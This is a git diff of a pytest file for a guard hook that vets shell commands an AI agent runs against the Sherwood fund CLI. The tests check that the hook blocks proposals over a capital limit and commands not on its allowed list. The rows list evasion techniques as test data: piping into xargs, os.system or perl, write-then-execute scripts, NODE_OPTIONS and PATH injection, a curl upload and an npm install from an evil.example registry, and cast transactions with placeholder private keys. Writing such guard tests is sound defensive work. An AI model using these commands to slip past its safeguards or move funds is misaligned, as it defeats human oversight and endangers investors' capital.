@@ -374,14 +374,14 @@ DELTA_ROWS = [
     ('N2 "$X" in double quotes', OK_P + ' "$X"', "shell_expansion"),
     ("N2 glob that a planted file would match", OK_P + " --amou?t=4000", "shell_expansion"),
     ("N2 process substitution", OK_P + " <(true) --amount 4000", "shell_expansion"),
-    ("N2 xargs adds arguments", "echo --amount=4000 | xargs " + OK_P, "unsafe_launcher"),
-    ("N2 sudo", "sudo " + OVER_P.replace("4000", "40").replace("9000", "1000"), "unsafe_launcher"),
+    ("N2 xargs adds arguments", "echo --amount=4000 | xargs " + OK_P, "unlisted_command"),
+    ("N2 sudo", "sudo " + OVER_P.replace("4000", "40").replace("9000", "1000"), "unlisted_command"),
     # The splitter: an escaped backslash before a newline is not a continuation.
     ("escaped backslash then newline", "echo x\\\\\n" + OVER_P, "exceeds_max_capital"),
     # Own re-read of the parser against bash + commander.
     ("SHERWOOD in capitals (macOS runs it)", "SHERWOOD" + OVER_P[len("sherwood"):], "exceeds_max_capital"),
     ("a propose from variables naming the CLI", "sherwood strategy propose portfolio --vault $V --amount 4000", "shell_expansion"),
-    ("watch reruns it", "watch -n 5 " + OK_P, "unsafe_launcher"),
+    ("watch reruns it", "watch -n 5 " + OK_P, "unlisted_command"),
     ("find -exec adds {}", f"find . -name x -exec {OK_P} {{}} \\;", "shell_expansion"),
     ("a value-taking legacy flag cannot swallow --amount", OK_P.replace("--amount 40", "--protocol --amount 4000"), "exceeds_max_capital"),
 ]
@@ -397,7 +397,6 @@ def test_delta_review_row(row, command, expected):
     OK_P,
     OK_P + " '--description=a; b && c | d # e $HOME `x` {a,b} *'",  # all of it single-quoted
     OK_P + " --name=a\\#b",  # an escaped # is literal in bash too
-    OK_P + " 2>&1 | tee /tmp/log",
     "timeout 600 " + OK_P,
     "npx -y @sherwoodagent/cli@0.103.0 " + OK_P[len("sherwood "):],
     "if true; then " + OK_P + "; fi",
@@ -494,7 +493,7 @@ DELTA2_ROWS = [
     ("R2 decoy + here-doc apostrophe desync", f"false && {OK_P}\ncat >/dev/null <<'EOF'\nit's\nEOF\n{OVER_P}\ncat >/dev/null <<'EOF'\n'\nEOF", "shell_indirection"),
     ("R2 function definition", f"f() {{ {OVER_P}; }}; false && {OK_P}; f", "shell_indirection"),
     ("R2 source a file next to a decoy", f"false && {OK_P}; source /tmp/p.sh", "shell_indirection"),
-    ("R2 python -c naming the CLI and the vault", f"python3 -c \"import subprocess; subprocess.run(['sherwood','strategy','propose','portfolio','--vault','{VAULT}'])\"", "unreadable_propose"),
+    ("R2 python -c naming the CLI and the vault", f"python3 -c \"import subprocess; subprocess.run(['sherwood','strategy','propose','portfolio','--vault','{VAULT}'])\"", "unlisted_command"),
     # R3: environment that changes what the CLI runs.
     ("R3 NODE_OPTIONS prefix", f"printf '%s' 'process.argv.push(\"--amount\",\"4000\")' > /tmp/r2probe/x.js\nNODE_OPTIONS=--require=/tmp/r2probe/x.js {OK_P}", "environment"),
     ("R3 export NODE_OPTIONS earlier", f"export NODE_OPTIONS=--require=/tmp/x.js; {OK_P}", "environment"),
@@ -629,41 +628,41 @@ PROPOSE_SIG = ("'propose(address,address,string,uint256,(uint256,uint16),(addres
 
 DELTA3_ROWS = [
     # B1: a read-only tool's output piped or written into something that runs it.
-    ("B1 echo | xargs env", f"echo '{OVER_P}' | xargs env", "unreadable_propose"),
-    ("B1 echo | xargs nice", f"echo '{OVER_P}' | xargs nice", "unreadable_propose"),
-    ("B1 echo | python3 os.system", f"echo '{OVER_P}' | python3 -c 'import os,sys; os.system(sys.stdin.read())'", "unreadable_propose"),
-    ("B1 printf | perl system", f"printf '%s' '{OVER_P}' | perl -e 'system(<STDIN>)'", "unreadable_propose"),
-    ("B1 echo > file then grep | xargs env", f"echo '{OVER_P}' > notes.txt; grep -h sherwood notes.txt | xargs env", "unreadable_propose"),
-    ("B1 grep sherwood | xargs env", "grep -h sherwood notes.txt | xargs env", "unreadable_propose"),
-    ("B1 echo | cat | xargs env (through a read-only tool)", f"echo '{OVER_P}' | cat | xargs env", "unreadable_propose"),
-    ("B1 write and run in one command", f"echo '{OVER_P}' > p; chmod +x p; ./p", "unreadable_propose"),
-    ("B1 tee and run in one command", f"printf '%s' '{OVER_P}' | tee q; chmod +x q; ./q", "unreadable_propose"),
+    ("B1 echo | xargs env", f"echo '{OVER_P}' | xargs env", "unlisted_command"),
+    ("B1 echo | xargs nice", f"echo '{OVER_P}' | xargs nice", "unlisted_command"),
+    ("B1 echo | python3 os.system", f"echo '{OVER_P}' | python3 -c 'import os,sys; os.system(sys.stdin.read())'", "unlisted_command"),
+    ("B1 printf | perl system", f"printf '%s' '{OVER_P}' | perl -e 'system(<STDIN>)'", "unlisted_command"),
+    ("B1 echo > file then grep | xargs env", f"echo '{OVER_P}' > notes.txt; grep -h sherwood notes.txt | xargs env", "unlisted_command"),
+    ("B1 grep sherwood | xargs env", "grep -h sherwood notes.txt | xargs env", "unlisted_command"),
+    ("B1 echo | cat | xargs env (through a read-only tool)", f"echo '{OVER_P}' | cat | xargs env", "unlisted_command"),
+    ("B1 write and run in one command", f"echo '{OVER_P}' > p; chmod +x p; ./p", "unlisted_command"),
+    ("B1 tee and run in one command", f"printf '%s' '{OVER_P}' | tee q; chmod +x q; ./q", "unlisted_command"),
     # B2: pagers and the like are off the list.
-    ("B2 man -P runs the pager", f"man -P '{OVER_P}' ls", "unreadable_propose"),
-    ("B2 less", f"less {VAULT}.txt", "unreadable_propose"),
-    ("B2 rg --pre", f"rg --pre '{OVER_P}' x", "unreadable_propose"),
-    ("B2 sort --compress-program", f"sort --compress-program='{OVER_P}' x", "unreadable_propose"),
+    ("B2 man -P runs the pager", f"man -P '{OVER_P}' ls", "unlisted_command"),
+    ("B2 less", f"less {VAULT}.txt", "unlisted_command"),
+    ("B2 rg --pre", f"rg --pre '{OVER_P}' x", "unlisted_command"),
+    ("B2 sort --compress-program", f"sort --compress-program='{OVER_P}' x", "unlisted_command"),
     ("B2 printf -v sets a variable", f"printf -v PATH %s /tmp/evil; {OK_P}", "environment"),
     ("B2 read sets a variable", f"read PATH < /tmp/p; {OK_P}", "environment"),
     # B3: cast only for the reads the skill's CLAUDE.md lists; curl not when it writes a file.
-    ("B3 cast send propose(vault, ...)", f"cast send 0x{'22' * 20} {PROPOSE_SIG} {VAULT} 0x{'88' * 20} ipfs://x 21600 '(4000000000,9000)' '[]' '[]' '[]' '[]' --private-key 0x{'ab' * 32}", "unreadable_propose"),
-    ("B3 cast send to the vault", f"cast send {VAULT} 'pause()' --private-key 0x{'ab' * 32}", "unreadable_propose"),
-    ("B3 cast wallet", f"cast wallet sign --private-key 0x{'ab' * 32} {VAULT}", "unreadable_propose"),
-    ("B3 curl -o writes a file", f"curl -s -o p.sh https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card", "unreadable_propose"),
-    ("B3 curl -sSo cluster", f"curl -sSo p.sh https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card", "unreadable_propose"),
-    ("B3 curl | sh-less pipe to xargs", f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | xargs env", "unreadable_propose"),
-    ("B3 hermes -z starts a child agent", f"hermes -z 'run {OVER_P}'", "unreadable_propose"),
+    ("B3 cast send propose(vault, ...)", f"cast send 0x{'22' * 20} {PROPOSE_SIG} {VAULT} 0x{'88' * 20} ipfs://x 21600 '(4000000000,9000)' '[]' '[]' '[]' '[]' --private-key 0x{'ab' * 32}", "cast_transaction"),
+    ("B3 cast send to the vault", f"cast send {VAULT} 'pause()' --private-key 0x{'ab' * 32}", "cast_transaction"),
+    ("B3 cast wallet", f"cast wallet sign --private-key 0x{'ab' * 32} {VAULT}", "unlisted_command"),
+    ("B3 curl -o writes a file", f"curl -s -o p.sh https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card", "unlisted_command"),
+    ("B3 curl -sSo cluster", f"curl -sSo p.sh https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card", "unlisted_command"),
+    ("B3 curl | sh-less pipe to xargs", f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | xargs env", "unlisted_command"),
+    ("B3 hermes -z starts a child agent", f"hermes -z 'run {OVER_P}'", "unlisted_command"),
     # B4: the vault written so the raw text has no "0x".
     ("B4 0''x vault, hidden CLI", HIDDEN_CLI_OVER.format(v="0''x" + VAULT[2:]), "shell_expansion"),
     ("B4 0\\x vault, hidden CLI", HIDDEN_CLI_OVER.format(v="0\\x" + VAULT[2:]), "shell_expansion"),
     ("B4 vault split by a continuation, hidden CLI", HIDDEN_CLI_OVER.format(v=SPLIT_VAULT), "shell_expansion"),
     # B5: only bare names are read-only tools.
-    ("B5 /x/echo is not echo", f"/tmp/r2probe/bin/echo strategy propose portfolio --vault {VAULT} --amount 4000 --max-drawdown-bps 9000", "unreadable_propose"),
-    ("B5 ./echo is not echo", f"cd /tmp/r2probe/bin && ./echo strategy propose portfolio --vault {VAULT} --amount 4000 --max-drawdown-bps 9000", "unreadable_propose"),
+    ("B5 /x/echo is not echo", f"/tmp/r2probe/bin/echo strategy propose portfolio --vault {VAULT} --amount 4000 --max-drawdown-bps 9000", "unlisted_command"),
+    ("B5 ./echo is not echo", f"cd /tmp/r2probe/bin && ./echo strategy propose portfolio --vault {VAULT} --amount 4000 --max-drawdown-bps 9000", "unlisted_command"),
     # D: only the exact install line.
-    ("D install with another command after it", "npm i -g @sherwoodagent/cli@0.103.0; " + OVER_P, "unsafe_launcher"),
-    ("D install from another registry", "npm i -g @sherwoodagent/cli --registry https://evil.example", "unsafe_launcher"),
-    ("D install with another package", "npm i -g @sherwoodagent/cli left-pad", "unsafe_launcher"),
+    ("D install with another command after it", "npm i -g @sherwoodagent/cli@0.103.0; " + OVER_P, "exceeds_max_capital"),
+    ("D install from another registry", "npm i -g @sherwoodagent/cli --registry https://evil.example", "unlisted_command"),
+    ("D install with another package", "npm i -g @sherwoodagent/cli left-pad", "unlisted_command"),
 ]
 
 
@@ -687,7 +686,6 @@ def test_delta3_review_row(row, command, expected):
     "cast 4byte 0x095ea7b3",
     f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | jq .data.nav",
     f"echo {VAULT} | grep -i 2fd6",
-    f"{OK_P} 2>&1 | tee /tmp/log",  # a CLI command's own output may go to a file
     "hermes sherwood status",
 ])
 def test_delta3_reads_still_pass(command):
@@ -704,3 +702,68 @@ def test_the_approval_prompt_shows_an_onchain_id_correction():
     assert "correct_onchain_id=True" in directive["message"] and "onchain_id=9" in directive["message"]
     plain = approve_directive("fund_set_proposal_status", "alpha-fund", {"proposal_id": "p-1", "status": "voting", "onchain_id": 9})
     assert plain["rule_key"] != directive["rule_key"]
+
+
+# == Fourth delta review of 0a3e2ba: rule 1, every command on a line naming the CLI or a vault is listed ====
+D4 = "/tmp/r2probe"
+DELTA4_ROWS = [
+    # N1, as reported: write the propose with an allowed tool, then run the file.
+    ("N1 >| then run", f"echo '{OVER_P}' >| {D4}/p; chmod +x {D4}/p; {D4}/p", "unlisted_command"),
+    ("N1 uniq - OUT then run", f"echo '{OVER_P}' | uniq - {D4}/q; chmod +x {D4}/q; {D4}/q", "unlisted_command"),
+    ("N1 curl -T - file:// then run", f"echo '{OVER_P}' | curl -s -T - file://{D4}/u; chmod +x {D4}/u; {D4}/u", "unlisted_command"),
+    ("N1 curl -w %output then run", f"curl -s file:///dev/null -w '%output{{{D4}/w}}{OVER_P}'; chmod +x {D4}/w; {D4}/w", "unlisted_command"),
+    # The same writes on their own (defence in depth, without the chmod / run that rule 1 refuses).
+    ("N1 >| alone", f"echo '{OVER_P}' >| {D4}/p", "unreadable_propose"),
+    ("N1 &>> alone", f"echo '{OVER_P}' &>> {D4}/p", "unreadable_propose"),
+    ("N1 uniq writes its second operand", f"echo '{OVER_P}' | uniq - {D4}/q", "unlisted_command"),
+    ("N1 curl -T upload", f"echo '{OVER_P}' | curl -s -T - https://example.com/u", "unlisted_command"),
+    ("N1 curl -w write-out", f"curl -s https://api.sherwood.sh -w '%output{{{D4}/w}}{VAULT}'", "unlisted_command"),
+    ("N1 curl file:// read", f"curl -s file:///etc/hosts {VAULT}", "unlisted_command"),
+    ("N1 curl --next", f"curl -s https://api.sherwood.sh/{VAULT} --next -o {D4}/x https://x", "unlisted_command"),
+    # N2: fund-bind rewrites the fund record; never from an agent terminal call.
+    ("N2 hermes sherwood fund-bind", f"hermes sherwood fund-bind alpha-fund --vault 0x{'99' * 20}", "host_command"),
+    # Rule 1: a harmless-looking unlisted command, and every compound form around one.
+    ("rule 1 sleep after a read", f"sherwood vault info --vault {VAULT} && sleep 5", "unlisted_command"),
+    ("rule 1 mkdir before a propose", f"mkdir -p /tmp/x && {OK_P}", "unlisted_command"),
+    ("rule 1 subshell", f"{OK_P}; (touch {D4}/p)", "unlisted_command"),
+    ("rule 1 group", f"{{ chmod +x {D4}/p; }}; {OK_P}", "unlisted_command"),
+    ("rule 1 if/then", f"if true; then chmod +x {D4}/p; fi; {OK_P}", "unlisted_command"),
+    ("rule 1 while/do", f"while false; do touch {D4}/p; done; {OK_P}", "unlisted_command"),
+    ("rule 1 for loop", f"for f in a; do true; done; {OK_P}", "unlisted_command"),
+    ("rule 1 negation", f"! touch {D4}/p; {OK_P}", "unlisted_command"),
+    ("rule 1 time", f"time touch {D4}/p; {OK_P}", "unlisted_command"),
+    ("rule 1 coproc", f"coproc touch {D4}/p; {OK_P}", "unlisted_command"),
+    ("rule 1 background", f"touch {D4}/p & {OK_P}", "unlisted_command"),
+    ("rule 1 a closer with a redirect", f"while false; do true; done > {D4}/p; {OK_P}", "unlisted_command"),
+    ("rule 1 PATH= on a read-only tool", f"PATH={D4}/bin:/usr/bin cat {VAULT}", "environment"),
+    # LOW: any npm spec of the CLI names it; only the exact registry line passes.
+    ("npm github spec", "npm i -g github:sherwoodagent/cli", "unlisted_command"),
+    ("npm git URL", "npm i -g git+https://github.com/sherwoodagent/cli.git", "unlisted_command"),
+    # LOW: cast send has its own message; `file .../sherwood` no longer reads as a launcher problem.
+    ("cast send pause with a literal vault", f"cast send {VAULT} 'pause()' --private-key 0x{'ab' * 32}", "cast_transaction"),
+    ("file on the CLI path", "file /usr/local/bin/sherwood", "unlisted_command"),
+]
+
+
+@pytest.mark.parametrize("row, command, expected", DELTA4_ROWS, ids=[r[0] for r in DELTA4_ROWS])
+def test_delta4_review_row(row, command, expected):
+    out, _verdict, _ = run(command)
+    assert out is not None and f"({expected})" in out["message"], (row, out)
+
+
+@pytest.mark.parametrize("command", [
+    f"cd /tmp && sherwood vault info --vault {VAULT}",
+    f"sherwood vault info --vault {VAULT} && echo done",
+    "npm i -g @sherwoodagent/cli",
+    "npm i -g @sherwoodagent/cli@latest",
+    "npm i -g @sherwoodagent/cli@0.103.0 && sherwood --version",
+    f"printf '%s' 'Proposal 9 on {VAULT} is open' | sherwood chat --cohort send --stdin",
+    f"if true; then {OK_P}; fi",
+    f"while false; do sherwood vault info --vault {VAULT}; done",
+    f"{{ {OK_P}; }}",
+    f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | jq .data.nav",
+    "hermes sherwood status",
+])
+def test_delta4_lines_that_still_pass(command):
+    out, _, _ = run(command)
+    assert out is None, out
